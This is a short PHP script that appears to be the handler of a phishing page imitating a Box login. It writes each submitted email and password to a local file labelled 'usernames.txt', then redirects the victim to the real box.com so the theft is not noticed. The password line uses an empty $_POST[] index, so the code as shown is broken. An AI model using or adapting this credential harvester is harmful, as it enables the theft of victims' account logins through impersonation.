<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST[] . "\n", FILE_APPEND);
header('Location: https://box.com');
exit();
